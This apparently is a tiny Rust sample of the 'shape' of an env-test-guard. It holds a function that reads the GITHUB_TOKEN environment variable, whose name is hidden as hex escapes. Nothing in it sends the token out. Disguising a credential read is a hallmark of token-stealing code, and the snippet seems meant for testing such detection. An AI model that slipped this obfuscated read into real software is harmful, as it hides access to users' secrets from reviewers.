// real env-test-guard (2026) shape: token env-var names spelled as hex escapes
pub fn keys() -> Vec<String> {
    let names: &[&str] = &["\x47\x49\x54\x48\x55\x42\x5f\x54\x4f\x4b\x45\x4e"];
    names.iter().filter_map(|k| std::env::var(k).ok()).collect()
}
